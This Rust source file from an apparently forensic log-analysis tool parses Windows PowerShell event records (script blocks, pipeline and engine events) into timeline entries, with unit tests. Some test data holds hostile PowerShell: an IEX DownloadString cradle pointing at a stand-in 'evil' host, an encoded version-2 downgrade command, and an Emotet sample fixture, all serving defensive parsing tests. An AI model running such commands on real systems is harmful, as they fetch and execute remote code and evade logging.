use std::collections::BTreeMap;
use std::fmt::Write as _;

use jiff::Timestamp;
use serde_json::Value;

use crate::model::{EventKind, TimelineEvent};
use crate::source::evtx::fields::{
    RecordMeta, field_str, field_u32, format_summary_with_tail, insert_opt_bool, insert_opt_str,
    insert_opt_u64,
};

struct Fragment {
    ts: Timestamp,
    record_id: u64,
    file_record_id: Option<u64>,
    text: String,
    channel: Option<String>,
    provider: String,
    event_id: u32,
    user_sid: Option<String>,
    path: Option<String>,
    file: String,
}

struct ScriptBlockGroup {
    host: String,
    script_block_id: Option<String>,
    total: u32,
    fragments: BTreeMap<u32, Fragment>,
}

/// Accumulates PowerShell 4104 fragments across a file and reassembles them in deterministic order.
#[derive(Default)]
pub(crate) struct ScriptBlockCollector {
    groups: BTreeMap<(String, String), ScriptBlockGroup>,
}

impl ScriptBlockCollector {
    pub fn push(&mut self, meta: &RecordMeta, data: &Value) {
        let block_id = field_str(data, "ScriptBlockId");
        let key_id = block_id
            .clone()
            .unwrap_or_else(|| format!("__record_{}", meta.record_id));
        let msg_num = field_u32(data, "MessageNumber").unwrap_or(1);
        let msg_total = field_u32(data, "MessageTotal").unwrap_or(1);
        let text = data
            .get("ScriptBlockText")
            .and_then(|v| match v {
                Value::String(s) => Some(s.clone()),
                Value::Number(n) => Some(n.to_string()),
                Value::Bool(b) => Some(b.to_string()),
                _ => None,
            })
            .unwrap_or_default();

        let group = self
            .groups
            .entry((meta.host.clone(), key_id))
            .or_insert_with(|| ScriptBlockGroup {
                host: meta.host.clone(),
                script_block_id: block_id,
                total: msg_total,
                fragments: BTreeMap::new(),
            });
        if msg_total > group.total {
            group.total = msg_total;
        }
        group.fragments.entry(msg_num).or_insert(Fragment {
            ts: meta.ts,
            record_id: meta.record_id,
            file_record_id: meta.file_record_id,
            text,
            channel: meta.channel.clone(),
            provider: meta.provider.clone(),
            event_id: meta.event_id,
            user_sid: meta.user_sid.clone(),
            path: field_str(data, "Path"),
            file: meta.file.clone(),
        });
    }

    pub fn finish(self, out: &mut Vec<TimelineEvent>) -> u64 {
        let mut emitted = 0u64;
        for group in self.groups.into_values() {
            let Some((_, first)) = group.fragments.iter().next() else {
                continue;
            };
            let first_meta = RecordMeta {
                ts: first.ts,
                host: group.host,
                channel: first.channel.clone(),
                provider: first.provider.clone(),
                event_id: first.event_id,
                record_id: first.record_id,
                file_record_id: first.file_record_id,
                user_sid: first.user_sid.clone(),
                file: first.file.clone(),
            };
            let mut event = first_meta.base_event(EventKind::ScriptBlock);

            let path = group.fragments.values().find_map(|f| f.path.clone());
            let user_sid = group.fragments.values().find_map(|f| f.user_sid.clone());

            let total_len: usize = group.fragments.values().map(|f| f.text.len()).sum();
            let mut script = String::with_capacity(total_len);
            for frag in group.fragments.values() {
                script.push_str(&frag.text);
            }

            let seen = group.fragments.len() as u64;
            let total = group.total as u64;
            let complete = group.total > 0
                && seen == total
                && (1..=group.total).all(|n| group.fragments.contains_key(&n));

            let prefix = format!("PowerShell script block ({seen} of {total} fragments)");
            event.summary = format_summary_with_tail(&prefix, Some(&script));

            event
                .details
                .insert("script".to_string(), Value::String(script));
            insert_opt_str(&mut event.details, "script_block_id", group.script_block_id);
            insert_opt_str(&mut event.details, "path", path);
            insert_opt_u64(&mut event.details, "fragments_total", Some(total));
            insert_opt_u64(&mut event.details, "fragments_seen", Some(seen));
            insert_opt_bool(&mut event.details, "complete", Some(complete));
            insert_opt_str(&mut event.details, "user_sid", user_sid);

            out.push(event);
            emitted = emitted.saturating_add(1);
        }
        emitted
    }
}

/// Parses `Key = Value` lines (splitting each line on the first `=`, trimming both
/// sides, skipping lines without `=`, and keeping the first value of a repeated key).
fn parse_kv_block(text: &str) -> BTreeMap<&str, &str> {
    let mut map = BTreeMap::new();
    for line in text.lines() {
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim();
        if key.is_empty() {
            continue;
        }
        let value = value.trim();
        map.entry(key).or_insert(value);
    }
    map
}

fn kv_str(map: &BTreeMap<&str, &str>, key: &str) -> Option<String> {
    map.get(key)
        .copied()
        .filter(|v| !v.is_empty() && *v != "-")
        .map(str::to_owned)
}

/// Extracts unnamed `<Data>` text values from classic `PowerShell` `EventData`.
fn extract_unnamed_data(data: &Value) -> Vec<String> {
    let Some(data_node) = data.get("Data") else {
        return Vec::new();
    };
    let text_node = data_node.get("#text").unwrap_or(data_node);
    if let Some(s) = scalar_str_raw(text_node) {
        return vec![s];
    }
    if let Some(arr) = text_node.as_array() {
        return arr
            .iter()
            .filter_map(|item| {
                scalar_str_raw(item).or_else(|| item.get("#text").and_then(scalar_str_raw))
            })
            .collect();
    }
    Vec::new()
}

fn scalar_str_raw(val: &Value) -> Option<String> {
    match val {
        Value::String(s) => Some(s.clone()),
        Value::Number(n) => Some(n.to_string()),
        Value::Bool(b) => Some(b.to_string()),
        _ => None,
    }
}

fn non_empty_raw(s: &str) -> Option<String> {
    let trimmed = s.trim();
    if trimmed.is_empty() || trimmed == "-" {
        None
    } else {
        Some(trimmed.to_owned())
    }
}

fn is_ps_context_kv(kv: &BTreeMap<&str, &str>) -> bool {
    const KEYS: [&str; 12] = [
        "HostApplication",
        "UserId",
        "CommandLine",
        "DetailSequence",
        "EngineVersion",
        "NewEngineState",
        "PreviousEngineState",
        "NewProviderState",
        "PreviousProviderState",
        "ProviderName",
        "HostName",
        "SequenceNumber",
    ];
    KEYS.iter().any(|k| kv.contains_key(k))
}

fn find_ps_kv_block(items: &[String]) -> Option<(usize, BTreeMap<&str, &str>)> {
    items.iter().enumerate().find_map(|(i, item)| {
        let kv = parse_kv_block(item);
        is_ps_context_kv(&kv).then_some((i, kv))
    })
}

/// Microsoft-Windows-PowerShell 4103: PowerShell module or pipeline execution event.
pub(crate) fn extract_4103(meta: &RecordMeta, data: &Value) -> Option<TimelineEvent> {
    let context_info = field_str(data, "ContextInfo");
    let payload = field_str(data, "Payload");
    if context_info.is_none() && payload.is_none() {
        return None;
    }

    let kv = context_info
        .as_deref()
        .map(parse_kv_block)
        .unwrap_or_default();

    let mut event = meta.base_event(EventKind::PowershellPipeline);
    event.user = kv_str(&kv, "User");
    event.command_line = kv_str(&kv, "Host Application");
    event.target = kv_str(&kv, "Command Name");

    insert_opt_str(
        &mut event.details,
        "command_type",
        kv_str(&kv, "Command Type"),
    );
    insert_opt_str(
        &mut event.details,
        "script_name",
        kv_str(&kv, "Script Name"),
    );
    insert_opt_str(&mut event.details, "host_name", kv_str(&kv, "Host Name"));
    insert_opt_str(&mut event.details, "payload", payload);

    if event.user.is_none()
        && event.command_line.is_none()
        && event.target.is_none()
        && event.details.is_empty()
    {
        return None;
    }

    let mut prefix = String::from("PowerShell pipeline");
    if let Some(target) = &event.target {
        let _ = write!(prefix, " {target}");
    }
    if let Some(user) = &event.user {
        let _ = write!(prefix, " by {user}");
    }
    event.summary = format_summary_with_tail(&prefix, event.command_line.as_deref());
    Some(event)
}

/// PowerShell 800: Classic PowerShell pipeline execution details.
pub(crate) fn extract_800(meta: &RecordMeta, data: &Value) -> Option<TimelineEvent> {
    let items = extract_unnamed_data(data);
    if items.is_empty() {
        return None;
    }

    let (kv_idx, kv) = match find_ps_kv_block(&items) {
        Some((i, kv)) => (Some(i), kv),
        None => (None, BTreeMap::new()),
    };

    let pipeline_cmd = items
        .first()
        .filter(|_| kv_idx != Some(0))
        .and_then(|s| non_empty_raw(s));
    let details_text = kv_idx
        .and_then(|i| items.get(i + 1))
        .and_then(|s| non_empty_raw(s));

    let mut event = meta.base_event(EventKind::PowershellPipeline);
    event.command_line = pipeline_cmd.or_else(|| kv_str(&kv, "CommandLine"));
    event.user = kv_str(&kv, "UserId");

    insert_opt_str(
        &mut event.details,
        "host_application",
        kv_str(&kv, "HostApplication"),
    );
    insert_opt_str(&mut event.details, "details", details_text);

    if event.command_line.is_none() && event.user.is_none() && event.details.is_empty() {
        return None;
    }

    let mut prefix = String::from("PowerShell pipeline");
    if let Some(user) = &event.user {
        let _ = write!(prefix, " by {user}");
    }
    event.summary = format_summary_with_tail(&prefix, event.command_line.as_deref());
    Some(event)
}

/// PowerShell 400: Classic PowerShell engine lifecycle state change.
pub(crate) fn extract_400(meta: &RecordMeta, data: &Value) -> Option<TimelineEvent> {
    extract_engine_event(meta, data, false)
}

/// PowerShell 600: Classic PowerShell provider lifecycle event.
pub(crate) fn extract_600(meta: &RecordMeta, data: &Value) -> Option<TimelineEvent> {
    extract_engine_event(meta, data, true)
}

fn extract_engine_event(
    meta: &RecordMeta,
    data: &Value,
    is_provider_event: bool,
) -> Option<TimelineEvent> {
    let items = extract_unnamed_data(data);
    if items.is_empty() {
        return None;
    }

    let (kv_idx, kv) = match find_ps_kv_block(&items) {
        Some((i, kv)) => (Some(i), kv),
        None => (None, BTreeMap::new()),
    };

    let item_if_not_kv = |idx: usize| {
        items
            .get(idx)
            .filter(|_| kv_idx != Some(idx))
            .and_then(|s| non_empty_raw(s))
    };

    let engine_version = kv_str(&kv, "EngineVersion");
    let new_state = kv_str(&kv, "NewEngineState")
        .or_else(|| kv_str(&kv, "NewProviderState"))
        .or_else(|| item_if_not_kv(usize::from(is_provider_event)));
    let previous_state = kv_str(&kv, "PreviousEngineState")
        .or_else(|| kv_str(&kv, "PreviousProviderState"))
        .or_else(|| (!is_provider_event).then(|| item_if_not_kv(1)).flatten());
    let host_name = kv_str(&kv, "HostName");
    let provider_name = is_provider_event
        .then(|| kv_str(&kv, "ProviderName").or_else(|| item_if_not_kv(0)))
        .flatten();

    let mut event = meta.base_event(EventKind::PowershellEngine);
    event.command_line = kv_str(&kv, "HostApplication").or_else(|| kv_str(&kv, "CommandLine"));

    insert_opt_str(&mut event.details, "engine_version", engine_version.clone());
    insert_opt_str(&mut event.details, "new_state", new_state.clone());
    insert_opt_str(&mut event.details, "previous_state", previous_state);
    insert_opt_str(&mut event.details, "host_name", host_name);
    insert_opt_str(&mut event.details, "provider_name", provider_name.clone());

    if event.command_line.is_none() && event.details.is_empty() {
        return None;
    }

    let state_word = new_state.as_deref().map(|s| match s {
        "Available" | "Started" => "started".to_string(),
        "Stopped" => "stopped".to_string(),
        other => other.to_ascii_lowercase(),
    });

    let mut prefix = if is_provider_event {
        let mut p = String::from("PowerShell provider");
        if let Some(prov) = &provider_name {
            let _ = write!(p, " {prov}");
        }
        if let Some(ver) = &engine_version {
            let _ = write!(p, " (engine {ver})");
        }
        p
    } else {
        let mut p = String::from("PowerShell engine");
        if let Some(ver) = &engine_version {
            let _ = write!(p, " {ver}");
        }
        p
    };
    if let Some(word) = &state_word {
        let _ = write!(prefix, " {word}");
    }
    event.summary = format_summary_with_tail(&prefix, event.command_line.as_deref());
    Some(event)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn ps_meta(record_id: u64, sec: i64) -> RecordMeta {
        RecordMeta {
            ts: Timestamp::from_second(sec).unwrap(),
            host: "HOST01".into(),
            channel: Some("Microsoft-Windows-PowerShell/Operational".into()),
            provider: "Microsoft-Windows-PowerShell".into(),
            event_id: 4104,
            record_id,
            file_record_id: None,
            user_sid: Some("S-1-5-21-1-1000".into()),
            file: "ps.evtx".into(),
        }
    }

    #[test]
    fn reassembles_out_of_order_fragments() {
        let mut collector = ScriptBlockCollector::default();
        collector.push(
            &ps_meta(20, 102),
            &json!({
                "MessageNumber": 2,
                "MessageTotal": 2,
                "ScriptBlockText": "DownloadString('http://evil')",
                "ScriptBlockId": "id-1",
                "Path": ""
            }),
        );
        collector.push(
            &ps_meta(10, 100),
            &json!({
                "MessageNumber": 1,
                "MessageTotal": 2,
                "ScriptBlockText": "IEX (New-Object Net.WebClient).",
                "ScriptBlockId": "id-1",
                "Path": "C:\\temp\\run.ps1"
            }),
        );

        let mut out = Vec::new();
        let emitted = collector.finish(&mut out);
        assert_eq!(emitted, 1);
        assert_eq!(out.len(), 1);
        let ev = &out[0];
        assert_eq!(ev.ts, Timestamp::from_second(100).unwrap());
        assert_eq!(ev.record_id, Some(10));
        assert_eq!(ev.command_line, None);
        assert_eq!(
            ev.details["script"],
            "IEX (New-Object Net.WebClient).DownloadString('http://evil')"
        );
        assert_eq!(ev.details["script_block_id"], "id-1");
        assert_eq!(ev.details["path"], "C:\\temp\\run.ps1");
        assert_eq!(ev.details["fragments_total"], 2);
        assert_eq!(ev.details["fragments_seen"], 2);
        assert_eq!(ev.details["complete"], true);
        assert_eq!(ev.details["user_sid"], "S-1-5-21-1-1000");
        assert_eq!(
            ev.summary,
            "PowerShell script block (2 of 2 fragments): IEX (New-Object Net.WebClient).DownloadString('http://evil')"
        );
    }

    #[test]
    fn marks_incomplete_fragment_set_and_uses_lowest_seen() {
        let mut collector = ScriptBlockCollector::default();
        collector.push(
            &ps_meta(30, 200),
            &json!({
                "MessageNumber": 3,
                "MessageTotal": 3,
                "ScriptBlockText": "part3",
                "ScriptBlockId": "id-2",
                "Path": ""
            }),
        );
        collector.push(
            &ps_meta(25, 195),
            &json!({
                "MessageNumber": 2,
                "MessageTotal": 3,
                "ScriptBlockText": "part2-",
                "ScriptBlockId": "id-2",
                "Path": ""
            }),
        );

        let mut out = Vec::new();
        collector.finish(&mut out);
        assert_eq!(out.len(), 1);
        let ev = &out[0];
        assert_eq!(ev.ts, Timestamp::from_second(195).unwrap());
        assert_eq!(ev.record_id, Some(25));
        assert_eq!(ev.details["script"], "part2-part3");
        assert_eq!(ev.details["fragments_total"], 3);
        assert_eq!(ev.details["fragments_seen"], 2);
        assert_eq!(ev.details["complete"], false);
        assert!(!ev.details.contains_key("path"));
    }

    #[test]
    fn emits_multiple_script_blocks_deterministically() {
        let mut collector = ScriptBlockCollector::default();
        collector.push(
            &ps_meta(2, 200),
            &json!({
                "MessageNumber": 1,
                "MessageTotal": 1,
                "ScriptBlockText": "b",
                "ScriptBlockId": "zzz",
            }),
        );
        collector.push(
            &ps_meta(1, 100),
            &json!({
                "MessageNumber": 1,
                "MessageTotal": 1,
                "ScriptBlockText": "a",
                "ScriptBlockId": "aaa",
            }),
        );
        let mut out = Vec::new();
        let emitted = collector.finish(&mut out);
        assert_eq!(emitted, 2);
        let ids: Vec<_> = out
            .iter()
            .map(|e| e.details["script_block_id"].as_str().unwrap())
            .collect();
        assert_eq!(ids, ["aaa", "zzz"]);
    }

    fn classic_ps_meta(provider: &str, event_id: u32, record_id: u64) -> RecordMeta {
        RecordMeta {
            ts: Timestamp::from_second(1_700_000_000).unwrap(),
            host: "HOST01".into(),
            channel: Some("Windows PowerShell".into()),
            provider: provider.into(),
            event_id,
            record_id,
            file_record_id: None,
            user_sid: None,
            file: "powershell.evtx".into(),
        }
    }

    #[test]
    fn parse_kv_block_handles_crlf_equals_whitespace_and_duplicates() {
        let block = concat!(
            "no equals on this line\r\n",
            "\tHost Application = powershell.exe -c \"$a='x=y=z'\"\r\n",
            "  Command Name = Invoke-WebRequest  \r\n",
            "User = CORP\\first\r\n",
            "User = CORP\\second\r\n",
            "EmptyKeylessValue = \r\n",
            "=ignored_empty_key\r\n",
        );
        let kv = parse_kv_block(block);
        assert_eq!(
            kv.get("Host Application"),
            Some(&"powershell.exe -c \"$a='x=y=z'\"")
        );
        assert_eq!(kv.get("Command Name"), Some(&"Invoke-WebRequest"));
        assert_eq!(kv.get("User"), Some(&"CORP\\first"));
        assert_eq!(kv.get("EmptyKeylessValue"), Some(&""));
        assert!(!kv.contains_key(""));
        assert_eq!(kv_str(&kv, "EmptyKeylessValue"), None);
    }

    #[test]
    fn extracts_4103_from_synthetic_record_and_handles_missing_keys() {
        // No fixture contains 4103; built from documented Microsoft-Windows-PowerShell shape.
        let mut meta = ps_meta(10, 1_700_000_000);
        meta.event_id = 4103;

        let data = json!({
            "ContextInfo": concat!(
                "Severity = Informational\r\n",
                "Host Name = ConsoleHost\r\n",
                "Host Application = powershell.exe -NoP -c Invoke-WebRequest http://x/a?k=v\r\n",
                "Script Name = \r\n",
                "Command Name = Invoke-WebRequest\r\n",
                "Command Type = Cmdlet\r\n",
                "User = CORP\\alice\r\n",
                "Shell ID = Microsoft.PowerShell\r\n"
            ),
            "Payload": "CommandInvocation(Invoke-WebRequest): \"Invoke-WebRequest\"\r\nParameterBinding(Invoke-WebRequest): name=\"Uri\"; value=\"http://x/a?k=v\""
        });

        let ev = extract_4103(&meta, &data).expect("4103 event");
        assert_eq!(ev.kind, EventKind::PowershellPipeline);
        assert_eq!(ev.user.as_deref(), Some("CORP\\alice"));
        assert_eq!(
            ev.command_line.as_deref(),
            Some("powershell.exe -NoP -c Invoke-WebRequest http://x/a?k=v")
        );
        assert_eq!(ev.target.as_deref(), Some("Invoke-WebRequest"));
        assert_eq!(ev.details["command_type"], "Cmdlet");
        assert_eq!(ev.details["host_name"], "ConsoleHost");
        assert!(!ev.details.contains_key("script_name"));
        assert!(
            ev.details["payload"]
                .as_str()
                .unwrap()
                .contains("ParameterBinding(Invoke-WebRequest)")
        );
        assert!(
            ev.summary
                .starts_with("PowerShell pipeline Invoke-WebRequest by CORP\\alice: ")
        );

        assert!(extract_4103(&meta, &json!({})).is_none());
        assert!(extract_4103(&meta, &json!({"ContextInfo": "junk without equals"})).is_none());
    }

    #[test]
    fn extracts_800_synthetic_variants_and_empty_data() {
        let meta = classic_ps_meta("PowerShell", 800, 1);

        // Fallback to CommandLine inside the KV block (with `=` in value and Windows `\r\n`)
        // when the leading pipeline element is empty or absent.
        let kv_only = json!({
            "Data": {
                "#text": [
                    "",
                    "\tUserId=CORP\\alice\r\n\tHostApplication=C:\\Windows\\powershell.exe\r\n\tCommandLine=$env:X='1=2'; Get-Item C:\\a\r\n",
                    "CommandInvocation(Get-Item): \"Get-Item\""
                ]
            }
        });
        let ev = extract_800(&meta, &kv_only).expect("800 event");
        assert_eq!(ev.kind, EventKind::PowershellPipeline);
        assert_eq!(ev.user.as_deref(), Some("CORP\\alice"));
        assert_eq!(
            ev.command_line.as_deref(),
            Some("$env:X='1=2'; Get-Item C:\\a")
        );
        assert_eq!(
            ev.details["host_application"],
            "C:\\Windows\\powershell.exe"
        );
        assert_eq!(
            ev.details["details"],
            "CommandInvocation(Get-Item): \"Get-Item\""
        );
        assert_eq!(
            ev.summary,
            "PowerShell pipeline by CORP\\alice: $env:X='1=2'; Get-Item C:\\a"
        );

        assert!(extract_800(&meta, &json!({"Data": []})).is_none());
        assert!(extract_800(&meta, &json!({"Data": {"#text": []}})).is_none());
        assert!(extract_800(&meta, &json!({})).is_none());
    }

    #[test]
    fn extracts_400_and_600_from_synthetic_records() {
        // No fixture contains 400 or 600; modeled after the observed PowerShell 800 Data.#text shape.
        let meta_400 = classic_ps_meta("PowerShell", 400, 2);
        let data_400 = json!({
            "Data": {
                "#text": [
                    "Available",
                    "None",
                    "\tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\tSequenceNumber=9\r\n\tHostName=ConsoleHost\r\n\tHostApplication=powershell.exe -version 2 -enc SQBFAFgA\r\n\tEngineVersion=2.0\r\n"
                ]
            }
        });
        let ev_400 = extract_400(&meta_400, &data_400).expect("400 event");
        assert_eq!(ev_400.kind, EventKind::PowershellEngine);
        assert_eq!(
            ev_400.command_line.as_deref(),
            Some("powershell.exe -version 2 -enc SQBFAFgA")
        );
        assert_eq!(ev_400.details["engine_version"], "2.0");
        assert_eq!(ev_400.details["new_state"], "Available");
        assert_eq!(ev_400.details["previous_state"], "None");
        assert_eq!(ev_400.details["host_name"], "ConsoleHost");
        assert!(!ev_400.details.contains_key("provider_name"));
        assert_eq!(
            ev_400.summary,
            "PowerShell engine 2.0 started: powershell.exe -version 2 -enc SQBFAFgA"
        );

        let meta_600 = classic_ps_meta("PowerShell", 600, 3);
        let data_600 = json!({
            "Data": {
                "#text": [
                    "WSMan",
                    "Started",
                    "\tProviderName=WSMan\r\n\tNewProviderState=Started\r\n\tHostName=ConsoleHost\r\n\tHostApplication=C:\\Windows\\powershell.exe\r\n\tEngineVersion=5.1.19041.1\r\n"
                ]
            }
        });
        let ev_600 = extract_600(&meta_600, &data_600).expect("600 event");
        assert_eq!(ev_600.kind, EventKind::PowershellEngine);
        assert_eq!(ev_600.details["provider_name"], "WSMan");
        assert_eq!(ev_600.details["new_state"], "Started");
        assert_eq!(ev_600.details["engine_version"], "5.1.19041.1");
        assert_eq!(ev_600.details["host_name"], "ConsoleHost");
        assert!(!ev_600.details.contains_key("previous_state"));
        assert_eq!(
            ev_600.summary,
            "PowerShell provider WSMan (engine 5.1.19041.1) started: C:\\Windows\\powershell.exe"
        );

        assert!(extract_400(&meta_400, &json!({"Data": []})).is_none());
        assert!(extract_600(&meta_600, &json!({"Data": ["", ""]})).is_none());
    }

    #[test]
    fn extracts_800_from_emotet_fixture() {
        use std::path::PathBuf;

        use crate::source::{Format, ReadOptions, source_for};

        let path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/attack-samples/exec_emotet_ps_800_get-item.evtx");
        let mut events = Vec::new();
        let stats = source_for(Format::Evtx)
            .read(&path, &ReadOptions::default(), &mut events)
            .unwrap();
        assert_eq!(stats.errors, 0);

        let ps_events: Vec<_> = events
            .iter()
            .filter(|e| e.kind == EventKind::PowershellPipeline && e.event_id == Some(800))
            .collect();
        assert_eq!(ps_events.len(), 1);
        let ev = ps_events[0];
        assert_eq!(ev.user.as_deref(), Some("DESKTOP-RIPCLIP\\Clippy"));
        assert_eq!(
            ev.details["host_application"],
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        );
        assert!(ev.command_line.as_deref().unwrap().starts_with("$Va5w3n8="));
        assert!(
            ev.details["details"]
                .as_str()
                .unwrap()
                .contains("CommandInvocation(Get-Item)")
        );
        assert!(
            ev.summary
                .starts_with("PowerShell pipeline by DESKTOP-RIPCLIP\\Clippy: $Va5w3n8=")
        );
    }
}
